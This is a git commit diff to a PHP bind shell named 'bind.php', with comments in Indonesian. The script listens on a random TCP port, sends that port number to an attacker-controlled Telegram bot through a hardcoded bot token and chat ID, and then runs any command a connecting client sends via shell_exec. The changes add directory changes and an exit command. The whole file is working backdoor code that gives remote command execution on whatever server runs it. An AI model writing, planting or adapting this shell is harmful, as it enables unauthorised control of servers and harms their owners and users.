e529de5acc9bc38b7cb9ca77bc58166aa521ce60
R10T <85335450+sunshine0110@users.noreply.github.com>
2023-10-09 14:43:44 +0700

    Update bind.php

--- bind.php
+++ bind.php
@@ -1,12 +1,24 @@
 <?php
-// Port yang akan di-bind
-$port = 4567;
-
 // Membuat socket
 $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 
-// Mengikat socket ke alamat dan port
-socket_bind($socket, '0.0.0.0', $port);
+// Mengikat socket ke alamat dan port secara acak
+socket_bind($socket, '0.0.0.0', 0);
+
+// Mendapatkan nomor port yang telah diikat secara acak
+socket_getsockname($socket, $ip, $port);
+
+// Mengirim pesan ke Telegram dengan port baru yang akan digunakan
+$botToken = '6377524606:AAGueU8euEgPDZHuV_wr31DeTxwKH9qhwso';
+$chatId = '5498177352';
+$message = "Server telah memulai dengan port baru: $port";
+$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+
+// Mengirim pesan ke Telegram menggunakan cURL
+$ch = curl_init($telegramUrl);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
 
 // Mendengarkan koneksi masuk
 socket_listen($socket);
@@ -15,6 +27,9 @@ echo "Server sedang mendengarkan di port $port...\n";
 
 // Menerima koneksi
 $client_socket = socket_accept($socket);
+
+// Pesan saat koneksi berhasil terhubung
+echo "Klien berhasil terhubung!\n";
 
 while (true) {
     // Membaca data dari koneksi
@@ -25,10 +40,26 @@ while (true) {
 
     // Menjalankan perintah pada sistem jika data tidak kosong
     if (!empty($data)) {
-        $output = shell_exec($data);
-
-        // Menambahkan karakter newline setelah perintah
-        $output = $data . "\n" . $output;
+        if ($data === 'exit') {
+            // Perintah untuk keluar
+            echo "Server dihentikan oleh klien.\n";
+            socket_close($client_socket);
+            socket_close($socket);
+            exit; // Keluar dari skrip
+        } elseif (strpos($data, 'cd ') === 0) {
+            // Perintah untuk berpindah direktori
+            $dir = substr($data, 3); // Mengambil direktori dari perintah
+            if (chdir($dir)) {
+                // Jika berhasil berpindah direktori
+                $output = "Berhasil pindah ke direktori: $dir";
+            } else {
+                // Jika gagal berpindah direktori
+                $output = "Gagal pindah ke direktori: $dir";
+            }
+        } else {
+            // Perintah selain 'cd' atau 'exit', menjalankan perintah sistem
+            $output = shell_exec($data);
+        }
 
         // Mengirim output ke klien
         socket_write($client_socket, $output, strlen($output));
@@ -38,11 +69,6 @@ while (true) {
     }
 }
 
-
-
-
-
-// Menutup koneksi
 socket_close($client_socket);
 socket_close($socket);
 ?>
